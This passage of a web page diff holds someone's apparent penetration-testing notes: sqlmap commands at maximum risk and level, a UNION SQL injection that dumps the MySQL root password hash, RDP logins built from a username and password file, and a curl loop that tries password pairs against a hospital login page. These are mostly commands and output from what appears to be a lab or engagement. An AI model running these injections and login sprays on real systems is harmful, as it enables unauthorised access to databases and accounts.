+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>--threads<span class="o">=</span><span class="m">10</span> 
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>--risk<span class="o">=</span><span class="m">3</span> <span class="c1">#MAX</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>--level<span class="o">=</span><span class="m">5</span> <span class="c1">#MAX</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>--dbms<span class="o">=</span><span class="s2">&quot;&lt;KNOWN DB TECH&gt;&quot;</span> 
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>--os<span class="o">=</span><span class="s2">&quot;&lt;OS&gt;&quot;</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>--technique<span class="o">=</span><span class="s2">&quot;UB&quot;</span> <span class="c1">#Use only techniques UNION and BLIND in that order (default &quot;BEUSTQ&quot;)</span>
+<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>--batch <span class="c1">#Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers</span>
+<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>--auth-type<span class="o">=</span><span class="s2">&quot;&lt;AUTH&gt;&quot;</span> <span class="c1">#HTTP authentication type (Basic, Digest, NTLM or PKI)</span>
+<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>--auth-cred<span class="o">=</span><span class="s2">&quot;&lt;AUTH&gt;&quot;</span> <span class="c1">#HTTP authentication credentials (name:password)</span>
+<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>--proxy<span class="o">=</span>http://127.0.0.1:8080
+<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>--union-char <span class="s2">&quot;GsFRts2&quot;</span> <span class="c1">#Help sqlmap identify union SQLi techniques with a weird union char</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>sqlmap -u <span class="si">${</span><span class="nv">URL</span><span class="si">}</span> --batch --auth-type<span class="o">=</span><span class="s2">&quot;Basic&quot;</span> --auth-cred<span class="o">=</span><span class="s2">&quot;douglas:1m1ghtbwrong?&quot;</span> --user-agent<span class="o">=</span>SQLMAP --random-agent --threads<span class="o">=</span><span class="m">10</span> --risk<span class="o">=</span><span class="m">3</span> --level<span class="o">=</span><span class="m">5</span>
+</code></pre></div>
+<p>authentication didn't work...</p>
+<p>trying sql UNION in the browser <code>' UNION SELECT 1,Password,User,4,5,6,7,8,9 FROM mysql.user WHERE user="root"#</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>root
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>*4D4660866D8BB729116A6BBE5913441937DF1432
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>sqlmap -u <span class="si">${</span><span class="nv">URL</span><span class="si">}</span> --batch --auth-type<span class="o">=</span><span class="s2">&quot;NTLM&quot;</span> --auth-cred<span class="o">=</span><span class="s2">&quot;ARMSDON\root:4D4660866D8BB729116A6BBE5913441937DF1432&quot;</span> --user-agent<span class="o">=</span>SQLMAP --random-agent --threads<span class="o">=</span><span class="m">10</span> --risk<span class="o">=</span><span class="m">3</span> --level<span class="o">=</span><span class="m">5</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>sqlmap -u <span class="s2">&quot;&lt;URL&gt;&quot;</span> --user-agent<span class="o">=</span>SQLMAP --random-agent --threads<span class="o">=</span><span class="m">10</span> --risk<span class="o">=</span><span class="m">3</span> --level<span class="o">=</span><span class="m">5</span> --dbms<span class="o">=</span><span class="s2">&quot;MySQL&quot;</span> --os<span class="o">=</span><span class="s2">&quot;ubuntu&quot;</span> --technique<span class="o">=</span><span class="s2">&quot;UB&quot;</span> --batch --auth-type<span class="o">=</span><span class="s2">&quot;Digest&quot;</span> --auth-cred<span class="o">=</span><span class="s2">&quot;root:4D4660866D8BB729116A6BBE5913441937DF1432&quot;</span> --union-char <span class="s2">&quot;GsFRts2&quot;</span>
+</code></pre></div>
+<hr />
+<p>DOMAIN="ARMSDON"
+USER=${USER}
+PASSWORD=${PASSWORD}</p>
+<p>xfreerdp /v:10.102.3.75 /u:${DOMAIN}\${USER} /p:${PASSWORD}</p>
+<p>cat userpass.txt | awk -F ',' '{ print "xfreerdp /v:10.102.3.75 /u:${DOMAIN}\${$1}" '</p>
+<p>cat userpass.txt | awk -F ',' '{ print "xfreerdp /v:10.102.3.75 /u:ARMSDON\" $1 " /p:" $2 }'</p>
+<hr />
+<p>SQL map is much faster using ${URL} with valid usnername/password</p>
+<hr />
+<p>testing some manual scripts</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">for</span> LIST <span class="k">in</span> <span class="k">$(</span>cat users-pass.txt<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>    <span class="nv">USERNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$LIST</span><span class="p">|</span> awk -F <span class="s1">&#39;;&#39;</span> <span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>    <span class="nv">PASSWORD</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$LIST</span><span class="p">|</span> awk -F <span class="s1">&#39;;&#39;</span> <span class="s1">&#39;{print $2}&#39;</span><span class="k">)</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>    <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$USERNAME</span><span class="s2"> and </span><span class="si">${</span><span class="nv">PASSWORD</span><span class="si">}</span><span class="s2">&quot;</span>
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>    curl --silent <span class="s2">&quot;http://10.102.7.214/login?hospital=fitton&amp;email=</span><span class="si">${</span><span class="nv">USERNAME</span><span class="si">}</span><span class="s2">%40fitton.hospital.com&amp;password=</span><span class="si">${</span><span class="nv">PASSWORD</span><span class="si">}</span><span class="s2">&quot;</span> <span class="p">|</span> wc -l
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="k">done</span>
+</code></pre></div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../mkdocs-basic-syntax/" class="md-footer__link md-footer__link--prev" aria-label="Previous: mkdocs-basic-syntax" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              mkdocs-basic-syntax
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../sites-to-follow/" class="md-footer__link md-footer__link--next" aria-label="Next: sites to follow" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              sites to follow
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2022, <a href="https://www.antoniofeijao.com/">Antonio Feijao UK</a>. All rights reserved.
+    </div>
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/antoniofeijaouk" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/AntonioFeijaoUK" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/AntonioFeijaoUK" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://instagram.com/AntonioFeijaoUK" target="_blank" rel="noopener" title="instagram.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tracking", "content.code.annotate", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.indexes", "navigation.top", "toc.follow", "toc.integrate"], "search": "../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.8492ddcf.min.js"></script>
+      
+    
+  </body>
+</html>
